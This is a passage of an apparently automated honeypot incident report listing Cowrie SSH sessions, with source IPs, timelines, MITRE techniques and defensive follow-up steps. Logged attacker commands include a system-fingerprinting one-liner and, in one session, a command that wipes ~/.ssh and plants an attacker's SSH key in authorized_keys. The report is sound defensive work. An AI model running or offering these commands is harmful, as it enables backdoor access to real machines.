| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:36:41` | `cowrie.session.connect` |
| `2026-07-24 17:36:42` | `cowrie.client.version` |
| `2026-07-24 17:36:42` | `cowrie.client.kex` |
| `2026-07-24 17:36:45` | `cowrie.login.success` |
| `2026-07-24 17:36:47` | `cowrie.session.params` |
| `2026-07-24 17:36:47` | `cowrie.command.input` |
| `2026-07-24 17:36:47` | `cowrie.command.input` |
| `2026-07-24 17:36:47` | `cowrie.command.input` |
| `2026-07-24 17:36:47` | `cowrie.command.input` |
| `2026-07-24 17:36:47` | `cowrie.command.input` |
| `2026-07-24 17:36:47` | `cowrie.command.success` |
| `2026-07-24 17:36:47` | `cowrie.command.input` |
| `2026-07-24 17:36:47` | `cowrie.command.input` |
| `2026-07-24 17:36:47` | `cowrie.command.input` |
| `2026-07-24 17:36:47` | `cowrie.command.input` |
| `2026-07-24 17:36:47` | `cowrie.log.closed` |
| `2026-07-24 17:36:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b657e9226cf2

| Field | Detail |
|---|---|
| **Source IP** | `177.174.0[.]3` |
| **First Seen** | 2026-07-24 17:37 |
| **Last Seen** | 2026-07-24 17:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:37:29` | `cowrie.session.connect` |
| `2026-07-24 17:37:30` | `cowrie.client.version` |
| `2026-07-24 17:37:30` | `cowrie.client.kex` |
| `2026-07-24 17:37:32` | `cowrie.login.success` |
| `2026-07-24 17:37:32` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:37:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.0[.]3` to AbuseIPDB if not already reported
- [ ] Block `177.174.0[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe0ccca967f8

| Field | Detail |
|---|---|
| **Source IP** | `62.182.132[.]94` |
| **First Seen** | 2026-07-24 17:37 |
| **Last Seen** | 2026-07-24 17:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:37:38` | `cowrie.session.connect` |
| `2026-07-24 17:37:38` | `cowrie.client.version` |
| `2026-07-24 17:37:38` | `cowrie.client.kex` |
| `2026-07-24 17:37:39` | `cowrie.login.success` |
| `2026-07-24 17:37:39` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:37:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.182.132[.]94` to AbuseIPDB if not already reported
- [ ] Block `62.182.132[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31aeff24999b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:37 |
| **Last Seen** | 2026-07-24 17:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:37:59` | `cowrie.session.connect` |
| `2026-07-24 17:38:00` | `cowrie.client.version` |
| `2026-07-24 17:38:00` | `cowrie.client.kex` |
| `2026-07-24 17:38:03` | `cowrie.login.success` |
| `2026-07-24 17:38:05` | `cowrie.session.params` |
| `2026-07-24 17:38:05` | `cowrie.command.input` |
| `2026-07-24 17:38:05` | `cowrie.command.input` |
| `2026-07-24 17:38:05` | `cowrie.command.input` |
| `2026-07-24 17:38:05` | `cowrie.command.input` |
| `2026-07-24 17:38:05` | `cowrie.command.input` |
| `2026-07-24 17:38:05` | `cowrie.command.success` |
| `2026-07-24 17:38:05` | `cowrie.command.input` |
| `2026-07-24 17:38:05` | `cowrie.command.input` |
| `2026-07-24 17:38:05` | `cowrie.command.input` |
| `2026-07-24 17:38:05` | `cowrie.command.input` |
| `2026-07-24 17:38:06` | `cowrie.log.closed` |
| `2026-07-24 17:38:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-723225135243

| Field | Detail |
|---|---|
| **Source IP** | `81.214.75[.]248` |
| **First Seen** | 2026-07-24 17:38 |
| **Last Seen** | 2026-07-24 17:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:38:09` | `cowrie.session.connect` |
| `2026-07-24 17:38:09` | `cowrie.client.version` |
| `2026-07-24 17:38:09` | `cowrie.client.kex` |
| `2026-07-24 17:38:10` | `cowrie.login.success` |
| `2026-07-24 17:38:10` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:38:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.214.75[.]248` to AbuseIPDB if not already reported
- [ ] Block `81.214.75[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08e7c9ed3b0b

| Field | Detail |
|---|---|
| **Source IP** | `71.229.1[.]186` |
| **First Seen** | 2026-07-24 17:38 |
| **Last Seen** | 2026-07-24 17:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:38:15` | `cowrie.session.connect` |
| `2026-07-24 17:38:15` | `cowrie.client.version` |
| `2026-07-24 17:38:15` | `cowrie.client.kex` |
| `2026-07-24 17:38:16` | `cowrie.login.success` |
| `2026-07-24 17:38:16` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.229.1[.]186` to AbuseIPDB if not already reported
- [ ] Block `71.229.1[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e696453a2339

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:39 |
| **Last Seen** | 2026-07-24 17:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:39:17` | `cowrie.session.connect` |
| `2026-07-24 17:39:18` | `cowrie.client.version` |
| `2026-07-24 17:39:18` | `cowrie.client.kex` |
| `2026-07-24 17:39:21` | `cowrie.login.success` |
| `2026-07-24 17:39:23` | `cowrie.session.params` |
| `2026-07-24 17:39:23` | `cowrie.command.input` |
| `2026-07-24 17:39:23` | `cowrie.command.input` |
| `2026-07-24 17:39:23` | `cowrie.command.input` |
| `2026-07-24 17:39:23` | `cowrie.command.input` |
| `2026-07-24 17:39:23` | `cowrie.command.input` |
| `2026-07-24 17:39:23` | `cowrie.command.success` |
| `2026-07-24 17:39:23` | `cowrie.command.input` |
| `2026-07-24 17:39:23` | `cowrie.command.input` |
| `2026-07-24 17:39:23` | `cowrie.command.input` |
| `2026-07-24 17:39:23` | `cowrie.command.input` |
| `2026-07-24 17:39:23` | `cowrie.log.closed` |
| `2026-07-24 17:39:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bd75a9550e9

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:40 |
| **Last Seen** | 2026-07-24 17:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:40:34` | `cowrie.session.connect` |
| `2026-07-24 17:40:35` | `cowrie.client.version` |
| `2026-07-24 17:40:35` | `cowrie.client.kex` |
| `2026-07-24 17:40:37` | `cowrie.login.success` |
| `2026-07-24 17:40:40` | `cowrie.session.params` |
| `2026-07-24 17:40:40` | `cowrie.command.input` |
| `2026-07-24 17:40:40` | `cowrie.command.input` |
| `2026-07-24 17:40:40` | `cowrie.command.input` |
| `2026-07-24 17:40:40` | `cowrie.command.input` |
| `2026-07-24 17:40:40` | `cowrie.command.input` |
| `2026-07-24 17:40:40` | `cowrie.command.success` |
| `2026-07-24 17:40:40` | `cowrie.command.input` |
| `2026-07-24 17:40:40` | `cowrie.command.input` |
| `2026-07-24 17:40:40` | `cowrie.command.input` |
| `2026-07-24 17:40:40` | `cowrie.command.input` |
| `2026-07-24 17:40:40` | `cowrie.log.closed` |
| `2026-07-24 17:40:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b479dd46a65

| Field | Detail |
|---|---|
| **Source IP** | `65.20.161[.]126` |
| **First Seen** | 2026-07-24 17:40 |
| **Last Seen** | 2026-07-24 17:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:40:50` | `cowrie.session.connect` |
| `2026-07-24 17:40:51` | `cowrie.client.version` |
| `2026-07-24 17:40:51` | `cowrie.client.kex` |
| `2026-07-24 17:40:52` | `cowrie.login.success` |
| `2026-07-24 17:40:53` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:40:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.161[.]126` to AbuseIPDB if not already reported
- [ ] Block `65.20.161[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bf750b068db

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-07-24 17:40 |
| **Last Seen** | 2026-07-24 17:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:40:58` | `cowrie.session.connect` |
| `2026-07-24 17:40:58` | `cowrie.client.version` |
| `2026-07-24 17:40:58` | `cowrie.client.kex` |
| `2026-07-24 17:40:59` | `cowrie.login.success` |
| `2026-07-24 17:41:00` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:41:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a98bf20138a6

| Field | Detail |
|---|---|
| **Source IP** | `174.126.222[.]110` |
| **First Seen** | 2026-07-24 17:41 |
| **Last Seen** | 2026-07-24 17:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:41:33` | `cowrie.session.connect` |
| `2026-07-24 17:41:34` | `cowrie.client.version` |
| `2026-07-24 17:41:34` | `cowrie.client.kex` |
| `2026-07-24 17:41:36` | `cowrie.login.success` |
| `2026-07-24 17:41:36` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:41:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.126.222[.]110` to AbuseIPDB if not already reported
- [ ] Block `174.126.222[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65b7f87d0157

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:41 |
| **Last Seen** | 2026-07-24 17:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:41:53` | `cowrie.session.connect` |
| `2026-07-24 17:41:54` | `cowrie.client.version` |
| `2026-07-24 17:41:54` | `cowrie.client.kex` |
| `2026-07-24 17:41:57` | `cowrie.login.success` |
| `2026-07-24 17:41:59` | `cowrie.session.params` |
| `2026-07-24 17:41:59` | `cowrie.command.input` |
| `2026-07-24 17:41:59` | `cowrie.command.input` |
| `2026-07-24 17:41:59` | `cowrie.command.input` |
| `2026-07-24 17:41:59` | `cowrie.command.input` |
| `2026-07-24 17:41:59` | `cowrie.command.input` |
| `2026-07-24 17:41:59` | `cowrie.command.success` |
| `2026-07-24 17:41:59` | `cowrie.command.input` |
| `2026-07-24 17:41:59` | `cowrie.command.input` |
| `2026-07-24 17:41:59` | `cowrie.command.input` |
| `2026-07-24 17:41:59` | `cowrie.command.input` |
| `2026-07-24 17:42:00` | `cowrie.log.closed` |
| `2026-07-24 17:42:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebd583d05219

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:43 |
| **Last Seen** | 2026-07-24 17:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:43:11` | `cowrie.session.connect` |
| `2026-07-24 17:43:12` | `cowrie.client.version` |
| `2026-07-24 17:43:12` | `cowrie.client.kex` |
| `2026-07-24 17:43:14` | `cowrie.login.success` |
| `2026-07-24 17:43:17` | `cowrie.session.params` |
| `2026-07-24 17:43:17` | `cowrie.command.input` |
| `2026-07-24 17:43:17` | `cowrie.command.input` |
| `2026-07-24 17:43:17` | `cowrie.command.input` |
| `2026-07-24 17:43:17` | `cowrie.command.input` |
| `2026-07-24 17:43:17` | `cowrie.command.input` |
| `2026-07-24 17:43:17` | `cowrie.command.success` |
| `2026-07-24 17:43:17` | `cowrie.command.input` |
| `2026-07-24 17:43:17` | `cowrie.command.input` |
| `2026-07-24 17:43:17` | `cowrie.command.input` |
| `2026-07-24 17:43:17` | `cowrie.command.input` |
| `2026-07-24 17:43:17` | `cowrie.log.closed` |
| `2026-07-24 17:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-470032ca8c8d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:44 |
| **Last Seen** | 2026-07-24 17:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:44:28` | `cowrie.session.connect` |
| `2026-07-24 17:44:29` | `cowrie.client.version` |
| `2026-07-24 17:44:29` | `cowrie.client.kex` |
| `2026-07-24 17:44:32` | `cowrie.login.success` |
| `2026-07-24 17:44:34` | `cowrie.session.params` |
| `2026-07-24 17:44:34` | `cowrie.command.input` |
| `2026-07-24 17:44:34` | `cowrie.command.input` |
| `2026-07-24 17:44:34` | `cowrie.command.input` |
| `2026-07-24 17:44:34` | `cowrie.command.input` |
| `2026-07-24 17:44:34` | `cowrie.command.input` |
| `2026-07-24 17:44:34` | `cowrie.command.success` |
| `2026-07-24 17:44:34` | `cowrie.command.input` |
| `2026-07-24 17:44:34` | `cowrie.command.input` |
| `2026-07-24 17:44:34` | `cowrie.command.input` |
| `2026-07-24 17:44:34` | `cowrie.command.input` |
| `2026-07-24 17:44:35` | `cowrie.log.closed` |
| `2026-07-24 17:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f1f41b3034d

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-07-24 17:45 |
| **Last Seen** | 2026-07-24 17:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:45:40` | `cowrie.session.connect` |
| `2026-07-24 17:45:40` | `cowrie.client.version` |
| `2026-07-24 17:45:40` | `cowrie.client.kex` |
| `2026-07-24 17:45:40` | `cowrie.login.success` |
| `2026-07-24 17:45:41` | `cowrie.session.params` |
| `2026-07-24 17:45:41` | `cowrie.command.input` |
| `2026-07-24 17:45:41` | `cowrie.command.failed` |
| `2026-07-24 17:45:41` | `cowrie.log.closed` |
| `2026-07-24 17:45:41` | `cowrie.session.params` |
| `2026-07-24 17:45:41` | `cowrie.command.input` |
| `2026-07-24 17:45:41` | `cowrie.session.file_download` |
| `2026-07-24 17:45:41` | `cowrie.log.closed` |
| `2026-07-24 17:45:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1c2627da435

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-07-24 17:45 |
| **Last Seen** | 2026-07-24 17:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:45:41` | `cowrie.session.connect` |
| `2026-07-24 17:45:41` | `cowrie.client.version` |
| `2026-07-24 17:45:41` | `cowrie.client.kex` |
| `2026-07-24 17:45:41` | `cowrie.login.success` |
| `2026-07-24 17:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4d8f33db5bd

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-07-24 17:45 |
| **Last Seen** | 2026-07-24 17:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:45:42` | `cowrie.session.connect` |
| `2026-07-24 17:45:42` | `cowrie.client.version` |
| `2026-07-24 17:45:42` | `cowrie.client.kex` |
| `2026-07-24 17:45:42` | `cowrie.login.success` |
| `2026-07-24 17:45:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5dc69bdc347

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:45 |
| **Last Seen** | 2026-07-24 17:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
